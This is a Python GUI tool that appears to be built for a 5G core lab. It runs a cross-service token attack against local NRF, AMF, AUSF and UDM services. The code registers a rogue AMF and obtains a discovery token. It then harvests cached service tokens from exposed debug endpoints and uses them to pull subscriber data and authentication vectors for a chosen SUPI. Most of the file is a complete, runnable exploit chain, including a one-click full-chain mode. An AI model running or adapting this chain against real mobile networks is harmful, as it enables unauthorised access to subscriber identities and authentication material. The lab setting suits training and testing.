#!/usr/bin/env python3
import json
import tkinter as tk
from tkinter import ttk
from tkinter.scrolledtext import ScrolledText

import requests

NRF = "http://localhost:8000"
UDM = "http://localhost:8001"
AUSF = "http://localhost:8002"
AMF = "http://localhost:8003"
SMF = "http://localhost:8004"

TIMEOUT = 6

STATE = {
    "nrf_token": "",
    "udm_token": "",
    "ausf_token": "",
}

COLORS = {
    "bg": "#0b1220",
    "panel": "#111827",
    "panel_alt": "#0f172a",
    "border": "#1f2937",
    "text": "#e2e8f0",
    "muted": "#94a3b8",
    "accent": "#38bdf8",
    "accent2": "#22c55e",
    "danger": "#f97316",
    "button": "#22c55e",
    "button_hover": "#16a34a",
    "button_pressed": "#15803d",
    "chip_bg": "#1e293b",
    "chip_border": "#334155",
    "warn": "#f59e0b",
}

FONT_SANS = "DejaVu Sans"
FONT_MONO = "DejaVu Sans Mono"


def pretty_json(obj):
    try:
        return json.dumps(obj, indent=2, sort_keys=True)
    except Exception:
        return str(obj)


def format_response(resp):
    if resp is None:
        return "No response"
    lines = [f"Status: {resp.status_code}"]
    content_type = resp.headers.get("Content-Type", "")
    lines.append(f"Content-Type: {content_type}")
    try:
        if "application/json" in content_type:
            lines.append("")
            lines.append(pretty_json(resp.json()))
        else:
            lines.append("")
            lines.append(resp.text)
    except Exception as exc:
        lines.append(f"\nFailed to parse body: {exc}\n{resp.text}")
    return "\n".join(lines)


def truncate_token(token):
    if not token:
        return "(none)"
    if len(token) <= 18:
        return token
    return f"{token[:8]}...{token[-8:]}"


class StepFrame(tk.Frame):
    def __init__(self, parent, title, on_run):
        super().__init__(
            parent,
            bg=COLORS["panel"],
            highlightthickness=1,
            highlightbackground=COLORS["border"],
        )
        self.on_run = on_run

        step_id, step_title = self.split_title(title)
        badge_text = f"STEP {step_id}" if step_id else "STEP"

        header = tk.Frame(self, bg=COLORS["panel"])
        header.pack(fill="x", padx=12, pady=(10, 6))

        badge = tk.Label(
            header,
            text=badge_text,
            bg=COLORS["accent"],
            fg=COLORS["bg"],
            font=(FONT_SANS, 9, "bold"),
            padx=8,
            pady=2,
        )
        badge.pack(side="left")

        title_label = tk.Label(
            header,
            text=step_title,
            bg=COLORS["panel"],
            fg=COLORS["text"],
            font=(FONT_SANS, 12, "bold"),
        )
        title_label.pack(side="left", padx=10)

        self.run_btn = ttk.Button(
            header,
            text="Send Request",
            style="Accent.TButton",
            command=self.on_click,
        )
        self.run_btn.pack(side="right")

        self.req_label = tk.Label(
            self,
            text="REQUEST",
            bg=COLORS["panel"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 9, "bold"),
        )
        self.req_label.pack(anchor="w", padx=12)

        self.req_text = tk.Text(
            self,
            bg=COLORS["panel"],
            fg=COLORS["text"],
            font=(FONT_MONO, 10),
            wrap="word",
            height=6,
            relief="flat",
            bd=0,
            highlightthickness=0,
            insertbackground=COLORS["text"],
            cursor="xterm",
        )
        self.req_text.pack(fill="x", padx=12, pady=(4, 10))
        self.req_text.configure(state="disabled")

        self.res_label = tk.Label(
            self,
            text="RESPONSE",
            bg=COLORS["panel"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 9, "bold"),
        )
        self.res_label.pack(anchor="w", padx=12)

        self.res_text = ScrolledText(
            self,
            height=15,
            wrap="word",
            font=(FONT_MONO, 10),
            bg=COLORS["panel_alt"],
            fg=COLORS["text"],
            insertbackground=COLORS["text"],
            relief="flat",
            highlightthickness=1,
            highlightbackground=COLORS["border"],
        )
        self.res_text.configure(state="disabled")
        self.res_text.pack(fill="both", expand=True, padx=12, pady=(4, 12))

    def on_click(self):
        self.on_run()

    @staticmethod
    def split_title(title):
        if ")" in title:
            left, right = title.split(")", 1)
            step_id = left.strip()
            step_title = right.strip()
            if step_id.isdigit():
                return step_id, step_title or title
        return "", title

    def set_request_text(self, text):
        self.req_text.configure(state="normal")
        self.req_text.delete("1.0", "end")
        self.req_text.insert("1.0", text)
        self.req_text.configure(state="disabled")

    def set_response_text(self, text):
        self.res_text.configure(state="normal")
        self.res_text.delete("1.0", "end")
        self.res_text.insert("1.0", text)
        self.res_text.configure(state="disabled")

    def set_running(self, running=True):
        self.run_btn.configure(state="disabled" if running else "normal")


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("5G SBA Attack Lab - Manual Operator Console")
        self.geometry("1200x860")
        self.minsize(760, 560)
        self.configure(bg=COLORS["bg"])
        # Brace the family name so Tk treats "DejaVu Sans" as one token.
        self.option_add("*Font", f"{{{FONT_SANS}}} 10")

        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("TFrame", background=COLORS["bg"])
        style.configure("TLabel", background=COLORS["bg"], foreground=COLORS["text"])
        style.configure(
            "Accent.TButton",
            background=COLORS["button"],
            foreground=COLORS["bg"],
            padding=(12, 6),
            font=(FONT_SANS, 10, "bold"),
            borderwidth=0,
            focusthickness=0,
        )
        style.map(
            "Accent.TButton",
            background=[
                ("active", COLORS["button_hover"]),
                ("pressed", COLORS["button_pressed"]),
            ],
            foreground=[("disabled", COLORS["muted"])],
        )
        style.configure(
            "Ghost.TButton",
            background=COLORS["chip_bg"],
            foreground=COLORS["text"],
            padding=(10, 6),
            font=(FONT_SANS, 10, "bold"),
            borderwidth=1,
            relief="solid",
        )
        style.map(
            "Ghost.TButton",
            background=[("active", COLORS["panel_alt"]), ("pressed", COLORS["panel"])],
            foreground=[("disabled", COLORS["muted"])],
        )
        style.configure(
            "Card.TEntry",
            fieldbackground=COLORS["panel_alt"],
            background=COLORS["panel_alt"],
            foreground=COLORS["text"],
        )
        style.configure(
            "Status.Horizontal.TProgressbar",
            troughcolor=COLORS["panel_alt"],
            bordercolor=COLORS["border"],
            background=COLORS["accent"],
            lightcolor=COLORS["accent"],
            darkcolor=COLORS["accent"],
        )

        self.canvas = tk.Canvas(self, borderwidth=0, background=COLORS["bg"], highlightthickness=0)
        self.scrollbar = ttk.Scrollbar(self, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = tk.Frame(self.canvas, bg=COLORS["bg"])

        self.scrollable_frame.bind(
            "<Configure>",
            lambda _e: self.canvas.configure(scrollregion=self.canvas.bbox("all")),
        )

        self.canvas_window = self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.bind(
            "<Configure>",
            lambda event: self.canvas.itemconfigure(self.canvas_window, width=event.width),
        )
        self.canvas.configure(yscrollcommand=self.scrollbar.set)

        self.canvas.pack(side="left", fill="both", expand=True, padx=(16, 0), pady=12)
        self.scrollbar.pack(side="right", fill="y", padx=(0, 16), pady=12)

        header = tk.Frame(self.scrollable_frame, bg=COLORS["bg"])
        header.pack(fill="x", padx=16, pady=(16, 10))

        hero = tk.Frame(
            header,
            bg=COLORS["panel"],
            highlightthickness=1,
            highlightbackground=COLORS["border"],
        )
        hero.pack(fill="x")

        accent_bar = tk.Frame(hero, bg=COLORS["accent"], width=6)
        accent_bar.pack(side="left", fill="y")

        hero_body = tk.Frame(hero, bg=COLORS["panel"])
        hero_body.pack(side="left", fill="both", expand=True, padx=16, pady=14)

        title = tk.Label(
            hero_body,
            text="5G SBA Cross-Service Token Attack",
            bg=COLORS["panel"],
            fg=COLORS["text"],
            font=(FONT_SANS, 18, "bold"),
        )
        title.pack(anchor="w")

        subtitle = tk.Label(
            hero_body,
            text="Manual, click-to-send workflow. Each step renders the exact request and response.",
            bg=COLORS["panel"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 10),
        )
        subtitle.pack(anchor="w", pady=(4, 0))

        hero_tag = tk.Label(
            hero,
            text="LAB MODE",
            bg=COLORS["panel"],
            fg=COLORS["accent2"],
            font=(FONT_SANS, 10, "bold"),
        )
        hero_tag.pack(side="right", padx=16, pady=16)

        controls = tk.Frame(self.scrollable_frame, bg=COLORS["bg"])
        controls.pack(fill="x", padx=16, pady=(0, 4))

        self.run_all_btn = ttk.Button(
            controls, text="Run Full Chain", style="Accent.TButton", command=self.run_full_chain
        )
        self.run_all_btn.pack(side="left")

        self.clear_btn = ttk.Button(
            controls, text="Clear Results", style="Ghost.TButton", command=self.clear_outputs
        )
        self.clear_btn.pack(side="left", padx=(8, 0))

        self.status_var = tk.StringVar(value="Ready. Execute any step or run the full chain.")
        self.status_label = tk.Label(
            controls,
            textvariable=self.status_var,
            bg=COLORS["bg"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 10),
            anchor="e",
            justify="right",
        )
        self.status_label.pack(side="right", fill="x", expand=True, padx=(10, 0))

        self.supi_var = tk.StringVar(value="imsi-001010000000001")

        self.token_row = tk.Frame(self.scrollable_frame, bg=COLORS["bg"])
        self.token_row.pack(fill="x", padx=16)

        self.nrf_token_value = self.create_token_card(
            self.token_row, 0, "NRF TOKEN", COLORS["accent"]
        )
        self.udm_token_value = self.create_token_card(
            self.token_row, 1, "UDM TOKEN", COLORS["accent2"]
        )
        self.ausf_token_value = self.create_token_card(
            self.token_row, 2, "AUSF TOKEN", COLORS["danger"]
        )
        self.supi_entry = self.create_input_card(
            self.token_row, 3, "TARGET SUPI", self.supi_var
        )

        self.steps = []

        self.step_health = self.add_step("0) Health Check", self.run_health)
        self.step_register = self.add_step("1) Register Rogue NF", self.run_register)
        self.step_token = self.add_step("2) Get NRF Discovery Token", self.run_get_nrf_token)
        self.step_discovery = self.add_step("3) Discover NFs", self.run_discover)
        self.step_amf_store = self.add_step("4) AMF /debug/token-store", self.run_amf_debug)
        self.step_ausf_store = self.add_step("5) AUSF /debug/token-store", self.run_ausf_debug)
        self.step_udm = self.add_step("6) Query UDM Subscriber Data", self.run_udm_query)
        self.step_ausf = self.add_step("7) Query AUSF Auth Vectors", self.run_ausf_auth)

        self.progress = ttk.Progressbar(
            self.scrollable_frame, mode="indeterminate", style="Status.Horizontal.TProgressbar"
        )
        self.progress.pack(fill="x", padx=16, pady=(0, 14))

        self.refresh_requests()
        self.update_token_labels()

        self.bind_all("<MouseWheel>", self._on_mousewheel)
        self.bind_all("<Button-4>", self._on_mousewheel_linux)
        self.bind_all("<Button-5>", self._on_mousewheel_linux)

    def create_token_card(self, parent, column, title, accent_color):
        card = tk.Frame(
            parent,
            bg=COLORS["panel"],
            highlightthickness=1,
            highlightbackground=COLORS["border"],
        )
        card.grid(row=0, column=column, padx=6, pady=8, sticky="nsew")
        parent.grid_columnconfigure(column, weight=1, uniform="cards")

        accent = tk.Frame(card, bg=accent_color, height=3)
        accent.pack(fill="x", side="top")

        label = tk.Label(
            card,
            text=title,
            bg=COLORS["panel"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 9, "bold"),
        )
        label.pack(anchor="w", padx=10, pady=(8, 2))

        value = tk.Label(
            card,
            text="(none)",
            bg=COLORS["panel"],
            fg=accent_color,
            font=(FONT_MONO, 10),
        )
        value.pack(anchor="w", padx=10, pady=(0, 10))
        return value

    def create_input_card(self, parent, column, title, variable):
        card = tk.Frame(
            parent,
            bg=COLORS["panel"],
            highlightthickness=1,
            highlightbackground=COLORS["border"],
        )
        card.grid(row=0, column=column, padx=6, pady=8, sticky="nsew")
        parent.grid_columnconfigure(column, weight=1, uniform="cards")

        accent = tk.Frame(card, bg=COLORS["accent"], height=3)
        accent.pack(fill="x", side="top")

        label = tk.Label(
            card,
            text=title,
            bg=COLORS["panel"],
            fg=COLORS["muted"],
            font=(FONT_SANS, 9, "bold"),
        )
        label.pack(anchor="w", padx=10, pady=(8, 4))

        entry = ttk.Entry(card, textvariable=variable, style="Card.TEntry")
        entry.configure(font=(FONT_SANS, 10))
        entry.pack(fill="x", padx=10, pady=(0, 10))
        entry.bind("<KeyRelease>", lambda _e: self.refresh_requests())
        return entry

    def add_step(self, title, handler):
        frame = StepFrame(
            self.scrollable_frame,
            title,
            lambda fr=None, fn=handler, lbl=title: self.run_step(frame, fn, lbl),
        )
        frame.pack(fill="x", padx=8, pady=10)
        self.steps.append(frame)
        return frame

    def update_token_labels(self):
        self.nrf_token_value.configure(text=truncate_token(STATE["nrf_token"]))
        self.udm_token_value.configure(text=truncate_token(STATE["udm_token"]))
        self.ausf_token_value.configure(text=truncate_token(STATE["ausf_token"]))
        if STATE["udm_token"] and STATE["ausf_token"]:
            self.status_var.set("Tokens extracted. Attack queries are ready.")

    def refresh_requests(self):
        supi = self.supi_var.get().strip() or "imsi-001010000000001"
        nrf_token = truncate_token(STATE["nrf_token"])
        udm_token = truncate_token(STATE["udm_token"])
        ausf_token = truncate_token(STATE["ausf_token"])

        self.step_health.set_request_text(
            "GET /health (NRF, UDM, AUSF, AMF, SMF)\n"
            f"NRF:  {NRF}/health\n"
            f"UDM:  {UDM}/health\n"
            f"AUSF: {AUSF}/health\n"
            f"AMF:  {AMF}/health\n"
            f"SMF:  {SMF}/health"
        )

        self.step_register.set_request_text(
            "PUT /nnrf-nfm/v1/nf-instances/rogue-amf-666\n"
            f"URL: {NRF}/nnrf-nfm/v1/nf-instances/rogue-amf-666\n"
            "Headers: Content-Type: application/json\n"
            "Body:\n"
            "{\n"
            "  \"nfType\": \"AMF\",\n"
            "  \"host\": \"attacker\",\n"
            "  \"port\": 8005,\n"
            "  \"nfServices\": [\"namf-comm\"]\n"
            "}"
        )

        self.step_token.set_request_text(
            "POST /oauth2/token\n"
            f"URL: {NRF}/oauth2/token\n"
            "Form: grant_type=client_credentials, nfInstanceId=rogue-amf-666, "
            "scope=nnrf-disc, nfType=AMF"
        )

        self.step_discovery.set_request_text(
            "GET /nnrf-disc/v1/nf-instances?target-nf-type=UDM|AUSF|AMF|SMF\n"
            f"URL: {NRF}/nnrf-disc/v1/nf-instances?target-nf-type=UDM (repeat per type)\n"
            f"Authorization: Bearer {nrf_token}"
        )

        self.step_amf_store.set_request_text(
            "GET /debug/token-store\n"
            f"URL: {AMF}/debug/token-store\n"
            f"Authorization: Bearer {nrf_token}"
        )

        self.step_ausf_store.set_request_text(
            "GET /debug/token-store\n"
            f"URL: {AUSF}/debug/token-store\n"
            f"Authorization: Bearer {nrf_token}"
        )

        self.step_udm.set_request_text(
            "GET /nudm-sdm/v1/:supi/am-data\n"
            f"URL: {UDM}/nudm-sdm/v1/{supi}/am-data\n"
            f"Authorization: Bearer {udm_token}"
        )

        self.step_ausf.set_request_text(
            "POST /nausf-auth/v1/ue-authentications\n"
            f"URL: {AUSF}/nausf-auth/v1/ue-authentications\n"
            f"Authorization: Bearer {ausf_token}\n"
            "Body:\n"
            "{\n"
            f"  \"supiOrSuci\": \"{supi}\",\n"
            "  \"servingNetworkName\": \"5G:mnc001.mcc001.3gppnetwork.org\"\n"
            "}"
        )

    def _on_mousewheel(self, event):
        if event.widget.winfo_class() == "Text":
            return
        self.canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")

    def _on_mousewheel_linux(self, event):
        if event.widget.winfo_class() == "Text":
            return
        if event.num == 4:
            self.canvas.yview_scroll(-1, "units")
        elif event.num == 5:
            self.canvas.yview_scroll(1, "units")

    def set_busy(self, busy, message=None):
        if busy:
            self.progress.start(12)
            self.run_all_btn.configure(state="disabled")
            self.clear_btn.configure(state="disabled")
            if message:
                self.status_var.set(message)
        else:
            self.progress.stop()
            self.run_all_btn.configure(state="normal")
            self.clear_btn.configure(state="normal")

    def run_step(self, frame, func, label):
        self.set_busy(True, f"Running: {label}")
        frame.set_running(True)
        self.update_idletasks()
        try:
            func()
            self.status_var.set(f"Done: {label}")
        except Exception as exc:
            self.status_var.set(f"Error in {label}: {exc}")
        finally:
            frame.set_running(False)
            self.set_busy(False)

    def run_full_chain(self):
        self.set_busy(True, "Running full chain...")
        self.run_all_btn.configure(state="disabled")
        self.clear_btn.configure(state="disabled")

        steps = [
            ("Health Check", self.run_health),
            ("Register Rogue NF", self.run_register),
            ("Get NRF Discovery Token", self.run_get_nrf_token),
            ("Discover NFs", self.run_discover),
            ("AMF token-store", self.run_amf_debug),
            ("AUSF token-store", self.run_ausf_debug),
            ("Query UDM", self.run_udm_query),
            ("Query AUSF", self.run_ausf_auth),
        ]

        self.update_idletasks()
        for label, fn in steps:
            self.status_var.set(f"Running: {label}")
            self.update_idletasks()
            try:
                fn()
            except Exception as exc:
                self.status_var.set(f"Failed at {label}: {exc}")
                self.set_busy(False)
                return
        self.status_var.set("Full chain completed. Review responses below.")
        self.set_busy(False)

    def clear_outputs(self):
        for step in self.steps:
            step.set_response_text("")
        self.status_var.set("Cleared responses.")

    def run_health(self):
        results = {}
        for name, url in {
            "NRF": NRF,
            "UDM": UDM,
            "AUSF": AUSF,
            "AMF": AMF,
            "SMF": SMF,
        }.items():
            try:
                resp = requests.get(f"{url}/health", timeout=TIMEOUT)
                results[name] = resp.json()
            except Exception as exc:
                results[name] = {"error": str(exc)}
        self.step_health.set_response_text(pretty_json(results))

    def run_register(self):
        body = {
            "nfType": "AMF",
            "host": "attacker",
            "port": 8005,
            "nfServices": ["namf-comm"],
        }
        try:
            resp = requests.put(
                f"{NRF}/nnrf-nfm/v1/nf-instances/rogue-amf-666",
                json=body,
                timeout=TIMEOUT,
            )
            self.step_register.set_response_text(format_response(resp))
        except Exception as exc:
            self.step_register.set_response_text(f"Request failed: {exc}")

    def run_get_nrf_token(self):
        try:
            resp = requests.post(
                f"{NRF}/oauth2/token",
                data={
                    "grant_type": "client_credentials",
                    "nfInstanceId": "rogue-amf-666",
                    "scope": "nnrf-disc",
                    "nfType": "AMF",
                },
                timeout=TIMEOUT,
            )
            self.step_token.set_response_text(format_response(resp))
            if resp.status_code == 200:
                token = resp.json().get("access_token", "")
                if token:
                    STATE["nrf_token"] = token
                    self.update_token_labels()
                    self.refresh_requests()
        except Exception as exc:
            self.step_token.set_response_text(f"Request failed: {exc}")

    def run_discover(self):
        if not STATE["nrf_token"]:
            self.step_discovery.set_response_text("Missing NRF token. Run step 2 first.")
            return
        results = {}
        for nf_type in ["UDM", "AUSF", "AMF", "SMF"]:
            try:
                resp = requests.get(
                    f"{NRF}/nnrf-disc/v1/nf-instances",
                    params={"target-nf-type": nf_type},
                    headers={"Authorization": f"Bearer {STATE['nrf_token']}"},
                    timeout=TIMEOUT,
                )
                results[nf_type] = resp.json()
            except Exception as exc:
                results[nf_type] = {"error": str(exc)}
        self.step_discovery.set_response_text(pretty_json(results))

    def run_amf_debug(self):
        if not STATE["nrf_token"]:
            self.step_amf_store.set_response_text("Missing NRF token. Run step 2 first.")
            return
        try:
            resp = requests.get(
                f"{AMF}/debug/token-store",
                headers={"Authorization": f"Bearer {STATE['nrf_token']}"},
                timeout=TIMEOUT,
            )
            self.step_amf_store.set_response_text(format_response(resp))
            if resp.status_code == 200:
                data = resp.json()
                self.extract_tokens(data)
        except Exception as exc:
            self.step_amf_store.set_response_text(f"Request failed: {exc}")

    def run_ausf_debug(self):
        if not STATE["nrf_token"]:
            self.step_ausf_store.set_response_text("Missing NRF token. Run step 2 first.")
            return
        try:
            resp = requests.get(
                f"{AUSF}/debug/token-store",
                headers={"Authorization": f"Bearer {STATE['nrf_token']}"},
                timeout=TIMEOUT,
            )
            self.step_ausf_store.set_response_text(format_response(resp))
            if resp.status_code == 200:
                data = resp.json()
                self.extract_tokens(data)
        except Exception as exc:
            self.step_ausf_store.set_response_text(f"Request failed: {exc}")

    def extract_tokens(self, data):
        tokens = data.get("cachedTokens", [])
        for ct in tokens:
            scope = ct.get("scope", "")
            token = ct.get("token", "")
            if not token:
                continue
            if "nudm-sdm" in scope and not STATE["udm_token"]:
                STATE["udm_token"] = token
            if "nausf-auth" in scope and not STATE["ausf_token"]:
                STATE["ausf_token"] = token
        self.update_token_labels()
        self.refresh_requests()

    def run_udm_query(self):
        if not STATE["udm_token"]:
            self.step_udm.set_response_text("Missing UDM token. Run steps 4/5 first.")
            return
        supi = self.supi_var.get().strip() or "imsi-001010000000001"
        try:
            resp = requests.get(
                f"{UDM}/nudm-sdm/v1/{supi}/am-data",
                headers={"Authorization": f"Bearer {STATE['udm_token']}"},
                timeout=TIMEOUT,
            )
            self.step_udm.set_response_text(format_response(resp))
        except Exception as exc:
            self.step_udm.set_response_text(f"Request failed: {exc}")

    def run_ausf_auth(self):
        if not STATE["ausf_token"]:
            self.step_ausf.set_response_text("Missing AUSF token. Run steps 4/5 first.")
            return
        supi = self.supi_var.get().strip() or "imsi-001010000000001"
        body = {
            "supiOrSuci": supi,
            "servingNetworkName": "5G:mnc001.mcc001.3gppnetwork.org",
        }
        try:
            resp = requests.post(
                f"{AUSF}/nausf-auth/v1/ue-authentications",
                headers={"Authorization": f"Bearer {STATE['ausf_token']}"},
                json=body,
                timeout=TIMEOUT,
            )
            self.step_ausf.set_response_text(format_response(resp))
        except Exception as exc:
            self.step_ausf.set_response_text(f"Request failed: {exc}")

if __name__ == "__main__":
    app = App()
    app.mainloop()
